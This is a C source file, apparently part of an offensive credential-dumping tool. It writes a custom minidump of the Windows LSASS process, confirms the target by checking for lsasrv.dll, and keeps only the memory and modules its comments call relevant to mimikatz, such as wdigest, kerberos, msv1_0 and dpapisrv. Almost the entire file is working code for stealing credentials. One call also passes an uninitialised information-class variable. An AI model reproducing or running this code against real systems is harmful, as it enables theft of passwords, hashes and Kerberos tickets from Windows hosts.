// SPDX-License-Identifier: Apache-2.0

#include <stdio.h>
#include <windows.h>

#include "minidump.h"
#include "externs.h"
#include "utils.h"

void writeat(Pdump_context dc, ULONG32 rva, const PVOID data, unsigned size) {
	PVOID dst = RVA(
		PVOID,
		dc->BaseAddress,
		rva
	);
	memcpy(dst, data, size);
}

BOOL append(Pdump_context dc, const PVOID data, unsigned size) {
	if (dc->rva + size > dc->DumpMaxSize) {
		printf(
			"The dump is too big, please increase DUMP_MAX_SIZE.\n"
		);
		return FALSE;
	}
	else {
		writeat(dc, dc->rva, data, size);
		dc->rva += size;
		return TRUE;
	}
}

BOOL write_header(Pdump_context dc) {

	MiniDumpHeader header;
	// the signature might or might not be valid
	header.Signature = dc->Signature;
	header.Version = dc->Version;
	header.ImplementationVersion = dc->ImplementationVersion;
	header.NumberOfStreams = 3; // we only need: SystemInfoStream, ModuleListStream and Memory64ListStream
	header.StreamDirectoryRva = SIZE_OF_HEADER;
	header.CheckSum = 0;
	header.Reserved = 0;
	header.TimeDateStamp = 0;
	header.Flags = MiniDumpNormal;

	char header_bytes[SIZE_OF_HEADER];
	int offset = 0;
	memcpy(header_bytes + offset, &header.Signature, 4); offset += 4;
	memcpy(header_bytes + offset, &header.Version, 2); offset += 2;
	memcpy(header_bytes + offset, &header.ImplementationVersion, 2); offset += 2;
	memcpy(header_bytes + offset, &header.NumberOfStreams, 4); offset += 4;
	memcpy(header_bytes + offset, &header.StreamDirectoryRva, 4); offset += 4;
	memcpy(header_bytes + offset, &header.CheckSum, 4); offset += 4;
	memcpy(header_bytes + offset, &header.Reserved, 4); offset += 4;
	memcpy(header_bytes + offset, &header.TimeDateStamp, 4); offset += 4;
	memcpy(header_bytes + offset, &header.Flags, 4);
	if (!append(dc, header_bytes, SIZE_OF_HEADER))
		return FALSE;

	return TRUE;
}

BOOL write_directory(Pdump_context dc, MiniDumpDirectory directory) {

	BYTE directory_bytes[SIZE_OF_DIRECTORY];
	int offset = 0;
	memcpy(directory_bytes + offset, &directory.StreamType, 4); offset += 4;
	memcpy(directory_bytes + offset, &directory.DataSize, 4); offset += 4;
	memcpy(directory_bytes + offset, &directory.Rva, 4);
	if (!append(dc, directory_bytes, sizeof(directory_bytes)))
		return FALSE;

	return TRUE;
}

BOOL write_directories(Pdump_context dc) {

	MiniDumpDirectory system_info_directory;
	system_info_directory.StreamType = SystemInfoStream;
	system_info_directory.DataSize = 0; // this is calculated and written later
	system_info_directory.Rva = 0; // this is calculated and written later
	if (!write_directory(dc, system_info_directory))
		return FALSE;

	MiniDumpDirectory module_list_directory;
	module_list_directory.StreamType = ModuleListStream;
	module_list_directory.DataSize = 0; // this is calculated and written later
	module_list_directory.Rva = 0; // this is calculated and written later
	if (!write_directory(dc, module_list_directory))
		return FALSE;

	MiniDumpDirectory memory64_list_directory;
	memory64_list_directory.StreamType = Memory64ListStream;
	memory64_list_directory.DataSize = 0; // this is calculated and written later
	memory64_list_directory.Rva = 0; // this is calculated and written later
	if (!write_directory(dc, memory64_list_directory))
		return FALSE;

	return TRUE;
}

BOOL write_system_info_stream(Pdump_context dc) {

	MiniDumpSystemInfo system_info;

	system_info.ProcessorArchitecture = PROCESSOR_ARCHITECTURE;
	typedef int(NTAPI* RtlGetNtVersionNumbers)(PDWORD, PDWORD, PDWORD);

	HINSTANCE hinst = LoadLibrary(L"ntdll.dll");
	DWORD dwMajor, dwMinor, dwBuildNumber = 0;
	RtlGetNtVersionNumbers proc = (RtlGetNtVersionNumbers)GetProcAddress(hinst, "RtlGetNtVersionNumbers");
	proc(&dwMajor, &dwMinor, &dwBuildNumber);
	system_info.MajorVersion = dwMajor;
	system_info.MinorVersion = dwMinor;
	system_info.BuildNumber = dwBuildNumber & 0xFFFF; // High 16 bits distinguish free and checked builds
	system_info.PlatformId = 0x2;

	system_info.CSDVersionRva = 0; // this is calculated and written later
	system_info.SuiteMask = 0;
	system_info.Reserved2 = 0;
	system_info.ProcessorFeatures1 = 0;
	system_info.ProcessorFeatures2 = 0;

	ULONG32 stream_size = SIZE_OF_SYSTEM_INFO_STREAM;
	ULONG32 stream_rva = dc->rva;
	if (!append(dc, &system_info, sizeof(system_info))) {
		return FALSE;
	}

	// write our length in the MiniDumpSystemInfo directory
	writeat(dc, SIZE_OF_HEADER + 4, &stream_size, 4); // header + streamType

													  // write our RVA in the MiniDumpSystemInfo directory
	writeat(dc, SIZE_OF_HEADER + 4 + 4, &stream_rva, 4); // header + streamType + Location.DataSize

														 // write the service pack
	ULONG32 sp_rva = dc->rva;

	// This is a fudge method to generate a null service pack string to avoid using CLR-incompatible intrinsics
	const WCHAR* szCSDVersion = L"";
	ULONG slen;
	slen = lstrlenW(szCSDVersion) * sizeof(WCHAR);
	if (!append(dc, &slen, 4))
		return FALSE;

	// write the service pack name
	if (!append(dc, (PVOID)szCSDVersion, slen))
		return FALSE;

	writeat(dc, stream_rva + 24, &sp_rva, 4); // addrof CSDVersionRva


	return TRUE;
}

Pmodule_info write_module_list_stream(Pdump_context dc) {

	// list of modules relevant to mimikatz
	wchar_t* important_modules[] = {
		L"lsasrv.dll", L"msv1_0.dll", L"tspkg.dll", L"wdigest.dll", L"kerberos.dll",
		L"livessp.dll", L"dpapisrv.dll", L"kdcsvc.dll", L"cryptdll.dll", L"lsadb.dll",
		L"samsrv.dll", L"rsaenh.dll", L"ncrypt.dll", L"ncryptprov.dll", L"eventlog.dll",
		L"wevtsvc.dll", L"termsrv.dll", L"cloudap.dll"
	};
	Pmodule_info module_list = find_modules(
		dc->hProcess,
		important_modules,
		ARRAY_SIZE(important_modules),
		TRUE
	);
	if (!module_list)
		return NULL;

	// write the full path of each dll
	Pmodule_info curr_module = module_list;
	ULONG32 number_of_modules = 0;
	while (curr_module) {

		number_of_modules++;
		curr_module->name_rva = dc->rva;
		ULONG32 full_name_length = wcsnlen((wchar_t*)&curr_module->dll_name, sizeof(curr_module->dll_name));
		full_name_length++; // account for the null byte at the end
		full_name_length *= 2;

		// write the length of the name
		if (!append(dc, &full_name_length, 4)) {
			free_linked_list(module_list); module_list = NULL;
			return NULL;
		}

		// write the path
		if (!append(dc, curr_module->dll_name, full_name_length)) {
			free_linked_list(module_list); module_list = NULL;
			return NULL;
		}
		curr_module = curr_module->next;
	}

	ULONG32 stream_rva = dc->rva;
	// write the number of modules
	if (!append(dc, &number_of_modules, 4)) {
		free_linked_list(module_list); module_list = NULL;
		return NULL;
	}

	BYTE module_bytes[SIZE_OF_MINIDUMP_MODULE];
	curr_module = module_list;

	while (curr_module) {
		MiniDumpModule module;
		module.BaseOfImage = (ULONG_PTR)curr_module->dll_base;
		module.SizeOfImage = curr_module->size_of_image;
		module.CheckSum = curr_module->CheckSum;
		module.TimeDateStamp = curr_module->TimeDateStamp;
		module.ModuleNameRva = curr_module->name_rva;
		module.VersionInfo.dwSignature = 0;
		module.VersionInfo.dwStrucVersion = 0;
		module.VersionInfo.dwFileVersionMS = 0;
		module.VersionInfo.dwFileVersionLS = 0;
		module.VersionInfo.dwProductVersionMS = 0;
		module.VersionInfo.dwProductVersionLS = 0;
		module.VersionInfo.dwFileFlagsMask = 0;
		module.VersionInfo.dwFileFlags = 0;
		module.VersionInfo.dwFileOS = 0;
		module.VersionInfo.dwFileType = 0;
		module.VersionInfo.dwFileSubtype = 0;
		module.VersionInfo.dwFileDateMS = 0;
		module.VersionInfo.dwFileDateLS = 0;
		module.CvRecord.DataSize = 0;
		module.CvRecord.rva = 0;
		module.MiscRecord.DataSize = 0;
		module.MiscRecord.rva = 0;
		module.Reserved0 = 0;
		module.Reserved0 = 0;

		int offset = 0;
		memcpy(module_bytes + offset, &module.BaseOfImage, 8); offset += 8;
		memcpy(module_bytes + offset, &module.SizeOfImage, 4); offset += 4;
		memcpy(module_bytes + offset, &module.CheckSum, 4); offset += 4;
		memcpy(module_bytes + offset, &module.TimeDateStamp, 4); offset += 4;
		memcpy(module_bytes + offset, &module.ModuleNameRva, 4); offset += 4;
		memcpy(module_bytes + offset, &module.VersionInfo.dwSignature, 4); offset += 4;
		memcpy(module_bytes + offset, &module.VersionInfo.dwStrucVersion, 4); offset += 4;
		memcpy(module_bytes + offset, &module.VersionInfo.dwFileVersionMS, 4); offset += 4;
		memcpy(module_bytes + offset, &module.VersionInfo.dwFileVersionLS, 4); offset += 4;
		memcpy(module_bytes + offset, &module.VersionInfo.dwProductVersionMS, 4); offset += 4;
		memcpy(module_bytes + offset, &module.VersionInfo.dwProductVersionLS, 4); offset += 4;
		memcpy(module_bytes + offset, &module.VersionInfo.dwFileFlagsMask, 4); offset += 4;
		memcpy(module_bytes + offset, &module.VersionInfo.dwFileFlags, 4); offset += 4;
		memcpy(module_bytes + offset, &module.VersionInfo.dwFileOS, 4); offset += 4;
		memcpy(module_bytes + offset, &module.VersionInfo.dwFileType, 4); offset += 4;
		memcpy(module_bytes + offset, &module.VersionInfo.dwFileSubtype, 4); offset += 4;
		memcpy(module_bytes + offset, &module.VersionInfo.dwFileDateMS, 4); offset += 4;
		memcpy(module_bytes + offset, &module.VersionInfo.dwFileDateLS, 4); offset += 4;
		memcpy(module_bytes + offset, &module.CvRecord.DataSize, 4); offset += 4;
		memcpy(module_bytes + offset, &module.CvRecord.rva, 4); offset += 4;
		memcpy(module_bytes + offset, &module.MiscRecord.DataSize, 4); offset += 4;
		memcpy(module_bytes + offset, &module.MiscRecord.rva, 4); offset += 4;
		memcpy(module_bytes + offset, &module.Reserved0, 8); offset += 8;
		memcpy(module_bytes + offset, &module.Reserved1, 8);

		if (!append(dc, module_bytes, sizeof(module_bytes))) {
			free_linked_list(module_list); module_list = NULL;
			return NULL;
		}
		curr_module = curr_module->next;
	}

	// write our length in the ModuleListStream directory
	ULONG32 stream_size = 4 + number_of_modules * sizeof(module_bytes);
	writeat(dc, SIZE_OF_HEADER + SIZE_OF_DIRECTORY + 4, &stream_size, 4); // header + 1 directory + streamType

																		  // write our RVA in the ModuleListStream directory
	writeat(dc, SIZE_OF_HEADER + SIZE_OF_DIRECTORY + 4 + 4, &stream_rva, 4); // header + 1 directory + streamType + Location.DataSize

	return module_list;
}

BOOL is_important_module(PVOID address, Pmodule_info module_list) {
	Pmodule_info curr_module = module_list;
	while (curr_module) {
		if ((ULONG_PTR)address >= (ULONG_PTR)curr_module->dll_base &&
			(ULONG_PTR)address < RVA(ULONG_PTR, curr_module->dll_base, curr_module->size_of_image))
			return TRUE;
		curr_module = curr_module->next;
	}
	return FALSE;
}

PMiniDumpMemoryDescriptor64 get_memory_ranges(Pdump_context dc, Pmodule_info module_list) {

	PMiniDumpMemoryDescriptor64 ranges_list = NULL;
	PVOID base_address, current_address;
	PMiniDumpMemoryDescriptor64 new_range;
	ULONG64 region_size;
	current_address = 0;
	MEMORY_INFORMATION_CLASS mic = MemoryBasicInformation;
	MEMORY_BASIC_INFORMATION mbi;

	while (TRUE)
	{
		NTSTATUS status = NtQueryVirtualMemory(
			dc->hProcess,
			(PVOID)current_address,
			mic,
			&mbi,
			sizeof(mbi),
			NULL
		);

		if (!NT_SUCCESS(status))
			break;

		base_address = mbi.BaseAddress;
		region_size = mbi.RegionSize;
		// next memory range
		current_address = (PVOID)((ULONG64)base_address + region_size);

		// ignore non-commited pages
		if (mbi.State != MEM_COMMIT)
			continue;

		// ignore pages with PAGE_NOACCESS
		if ((mbi.Protect & PAGE_NOACCESS) == PAGE_NOACCESS)
			continue;

		// ignore mapped pages
		if (mbi.Type == MEM_MAPPED)
			continue;

		// ignore pages with PAGE_GUARD as they can't be read
		if ((mbi.Protect & PAGE_GUARD) == PAGE_GUARD)
			continue;

		// ignore modules that are not relevant to mimikatz
		if (mbi.Type == MEM_IMAGE && !is_important_module(base_address, module_list))
			continue;

		new_range = (PMiniDumpMemoryDescriptor64)intAlloc(sizeof(MiniDumpMemoryDescriptor64));
		if (!new_range)
		{
#ifdef DEBUG
			printf(
				"Failed to call HeapAlloc for 0x%x bytes, error: %ld\n",
				(ULONG32)sizeof(MiniDumpMemoryDescriptor64),
				GetLastError()
			);
#endif
			return NULL;
		}
		new_range->next = NULL;
		new_range->StartOfMemoryRange = (ULONG_PTR)base_address;
		new_range->DataSize = region_size;
		new_range->State = mbi.State;
		new_range->Protect = mbi.Protect;
		new_range->Type = mbi.Type;

		if (!ranges_list) {
			ranges_list = new_range;
		}
		else {
			PMiniDumpMemoryDescriptor64 last_range = ranges_list;
			while (last_range->next)
				last_range = last_range->next;
			last_range->next = new_range;
		}
	}
	return ranges_list;
}

PMiniDumpMemoryDescriptor64 write_memory64_list_stream(Pdump_context dc, Pmodule_info module_list) {

	PMiniDumpMemoryDescriptor64 memory_ranges;
	ULONG32 stream_rva = dc->rva;

	memory_ranges = get_memory_ranges(dc, module_list);

	if (!memory_ranges)
		return NULL;

	// write the number of ranges
	PMiniDumpMemoryDescriptor64 curr_range = memory_ranges;
	ULONG64 number_of_ranges = 0;
	while (curr_range) {
		number_of_ranges++;
		curr_range = curr_range->next;
	}

	if (!append(dc, &number_of_ranges, 8)) {
		free_linked_list(memory_ranges);
		memory_ranges = NULL;
		return NULL;
	}

	// write the rva of the actual memory content
	ULONG32 stream_size = 16 + 16 * number_of_ranges;
	ULONG64 base_rva = stream_rva + stream_size;
	if (!append(dc, &base_rva, 8)) {
		free_linked_list(memory_ranges); memory_ranges = NULL;
		return NULL;
	}

	// write the start and size of each memory range
	curr_range = memory_ranges;
	while (curr_range) {

		if (!append(dc, &curr_range->StartOfMemoryRange, 8)) {
			free_linked_list(memory_ranges); memory_ranges = NULL;
			return NULL;
		}

		if (!append(dc, &curr_range->DataSize, 8)) {
			free_linked_list(memory_ranges); memory_ranges = NULL;
			return NULL;
		}

		curr_range = curr_range->next;
	}

	// write our length in the Memory64ListStream directory
	writeat(dc, SIZE_OF_HEADER + SIZE_OF_DIRECTORY * 2 + 4, &stream_size, 4); // header + 2 directories + streamType

																			  // write our RVA in the Memory64ListStream directory
	writeat(dc, SIZE_OF_HEADER + SIZE_OF_DIRECTORY * 2 + 4 + 4, &stream_rva, 4); // header + 2 directories + streamType + Location.DataSize

																				 // dump all the selected memory ranges
	curr_range = memory_ranges;
	while (curr_range) {

		// DataSize can be very large but HeapAlloc should be able to handle it
		PBYTE buffer = (PBYTE)intAlloc(curr_range->DataSize);
		if (!buffer) {
#ifdef DEBUG

			printf(
				"Failed to call HeapAlloc for 0x%llx bytes, error: %ld\n",
				curr_range->DataSize,
				GetLastError()
			);
#endif
			return NULL;
		}
		NTSTATUS status = NtReadVirtualMemory(
			dc->hProcess,
			(PVOID)(ULONG_PTR)curr_range->StartOfMemoryRange,
			buffer,
			curr_range->DataSize,
			NULL
		);

		// once in a while, a range fails with STATUS_PARTIAL_COPY, not relevant for mimikatz
		if (!NT_SUCCESS(status) && status != STATUS_PARTIAL_COPY) {
#ifdef DEBUG
			printf(
				"Failed to read memory range: StartOfMemoryRange: 0x%p, DataSize: 0x%llx, State: 0x%lx, Protect: 0x%lx, Type: 0x%lx, NtReadVirtualMemory status: 0x%lx. Continuing anyways...\n",
				(PVOID)(ULONG_PTR)curr_range->StartOfMemoryRange,
				curr_range->DataSize,
				curr_range->State,
				curr_range->Protect,
				curr_range->Type,
				status
			);
#endif
		}
		if (!append(dc, buffer, curr_range->DataSize)) {
			free_linked_list(memory_ranges); memory_ranges = NULL;
			intFree(buffer); buffer = NULL;
			return NULL;
		}

		// overwrite it first, just in case
		memset(buffer, 0, curr_range->DataSize);
		intFree(buffer); buffer = NULL;
		curr_range = curr_range->next;
	}

	return memory_ranges;
}

PVOID get_peb_address(HANDLE hProcess) {

    PROCESS_BASIC_INFORMATION basic_info;
	PROCESSINFOCLASS ProcessInformationClass;
    NTSTATUS status = NtQueryInformationProcess(
        hProcess,
        ProcessInformationClass,
        &basic_info,
        sizeof(PROCESS_BASIC_INFORMATION),
        NULL
    );

    if (!NT_SUCCESS(status)) {
#ifdef DEBUG
        printf(
            "Failed to call NtQueryInformationProcess, status: 0x%lx\n",
            status
        );
#endif
        return 0;
    }

    return basic_info.PebBaseAddress;
}

PVOID get_module_list_address(HANDLE hProcess,BOOL is_lsass) {

    PVOID peb_address, ldr_pointer, ldr_address, module_list_pointer, ldr_entry_address;

    peb_address = get_peb_address(hProcess);
    if (!peb_address)
        return NULL;

	// Added ULONG64 cast here
    ldr_pointer = (PVOID) ((ULONG64) peb_address + LDR_POINTER_OFFSET);

    NTSTATUS status = NtReadVirtualMemory(
        hProcess,
        (PVOID)ldr_pointer,
        &ldr_address,
        sizeof(PVOID),
        NULL
    );

    if (status == STATUS_PARTIAL_COPY && !is_lsass) {
        // failed to read the memory of some process, simply continue
        return NULL;
    }

    if (!NT_SUCCESS(status)) {
#ifdef DEBUG
        printf(
            "Failed to call NtReadVirtualMemory, status: 0x%lx\n",
            status
        );
#endif
        return NULL;
    }

    module_list_pointer = (PVOID) ((ULONG64) ldr_address + MODULE_LIST_POINTER_OFFSET);

    status = NtReadVirtualMemory(
        hProcess,
        (PVOID)module_list_pointer,
        &ldr_entry_address,
        sizeof(PVOID),
        NULL
    );

    if (!NT_SUCCESS(status)) {
#ifdef DEBUG
        printf(
            "Failed to call NtReadVirtualMemory, status: 0x%lx\n",
            status
        );
#endif
        return NULL;
    }

    return ldr_entry_address;
}

Pmodule_info add_new_module(HANDLE hProcess, struct LDR_DATA_TABLE_ENTRY *ldr_entry)
{
    Pmodule_info new_module = (Pmodule_info) intAlloc(sizeof(module_info));
    if (!new_module) {
#ifdef DEBUG
        printf(
            "Failed to call HeapAlloc for 0x%x bytes, error: %ld\n",
            (ULONG32)sizeof(module_info),
            GetLastError()
        );
#endif
        return NULL;
    }

    new_module->next = NULL;
    new_module->dll_base = (ULONG64)(ULONG_PTR)ldr_entry->DllBase;
    new_module->size_of_image = ldr_entry->SizeOfImage;
    new_module->TimeDateStamp = ldr_entry->TimeDateStamp;
    new_module->CheckSum = ldr_entry->CheckSum;

    // read the full path of the DLL
    NTSTATUS status = NtReadVirtualMemory(
        hProcess,
        (PVOID)ldr_entry->FullDllName.Buffer,
        new_module->dll_name,
        ldr_entry->FullDllName.Length,
        NULL
    );

    if (!NT_SUCCESS(status)) {
#ifdef DEBUG
        printf(
            "Failed to call NtReadVirtualMemory, status: 0x%lx\n",
            status
        );
#endif
        return NULL;
    }
    return new_module;
}

BOOL read_ldr_entry(
    HANDLE hProcess,
    PVOID ldr_entry_address,
    struct LDR_DATA_TABLE_ENTRY* ldr_entry,
    wchar_t* base_dll_name
)
{
    // read the entry
    NTSTATUS status = NtReadVirtualMemory(
        hProcess,
        ldr_entry_address,
        ldr_entry,
        sizeof(struct LDR_DATA_TABLE_ENTRY),
        NULL
    );

    if (!NT_SUCCESS(status)) {
#ifdef DEBUG
        printf(
            "Failed to call NtReadVirtualMemory, status: 0x%lx\n",
            status
        );
#endif
        return FALSE;
    }

    // initialize base_dll_name with all null-bytes
    memset(base_dll_name, 0, MAX_PATH);
    // read the dll name
    status = NtReadVirtualMemory(
        hProcess,
        (PVOID)ldr_entry->BaseDllName.Buffer,
        base_dll_name,
        ldr_entry->BaseDllName.Length,
        NULL
    );

    if (!NT_SUCCESS(status)) {
#ifdef DEBUG
        printf(
            "Failed to call NtReadVirtualMemory, status: 0x%lx\n",
            status
        );
#endif
        return FALSE;
    }
    return TRUE;
}

Pmodule_info find_modules(
    HANDLE hProcess,
    wchar_t* important_modules[],
    int number_of_important_modules,
    BOOL is_lsass
)
{
    // module list
    Pmodule_info module_list = NULL;

    // find the address of LDR_DATA_TABLE_ENTRY
    PVOID ldr_entry_address = get_module_list_address(hProcess, is_lsass);

    if (!ldr_entry_address)
        return NULL;

    PVOID first_ldr_entry_address = ldr_entry_address;
    SHORT dlls_found = 0;
    BOOL lsasrv_found = FALSE;
    struct LDR_DATA_TABLE_ENTRY ldr_entry;
    wchar_t base_dll_name[MAX_PATH];

    // loop over each DLL loaded, looking for the important modules
    while (dlls_found < number_of_important_modules)
    {
        // read the current entry
        BOOL success = read_ldr_entry(
            hProcess,
            ldr_entry_address,
            &ldr_entry,
            base_dll_name
        );
        if (!success)
            return NULL;

        // loop over each important module and see if we have a match
        for (int i = 0; i < number_of_important_modules; i++)
        {
            // compare the DLLs' name, case insensitive
            if (!_wcsicmp(important_modules[i], base_dll_name))
            {
                // check if the DLL is 'lsasrv.dll' so that we know the process is indeed LSASS
                if (!_wcsicmp(important_modules[i], LSASRV_DLL))
                    lsasrv_found = TRUE;

                // add the new module to the linked list
                Pmodule_info new_module = add_new_module(hProcess, &ldr_entry);

                if (!new_module)
                    return NULL;

                if (!module_list) {
                    module_list = new_module;
                } else {
                    Pmodule_info last_module = module_list;
                    while (last_module->next)
                        last_module = last_module->next;
                    last_module->next = new_module;
                }

                dlls_found++;
                break;
            }
        }

        // set the next entry as the current entry
        ldr_entry_address = ldr_entry.InMemoryOrderLinks.Flink;

        // if we are back at the beginning, break
        if (ldr_entry_address == first_ldr_entry_address)
            break;
    }

    // the LSASS process should always have 'lsasrv.dll' loaded
    if (is_lsass && !lsasrv_found) {
        printf(
            "This selected process is not LSASS.\n"
        );
        return NULL;
    }
    return module_list;
}
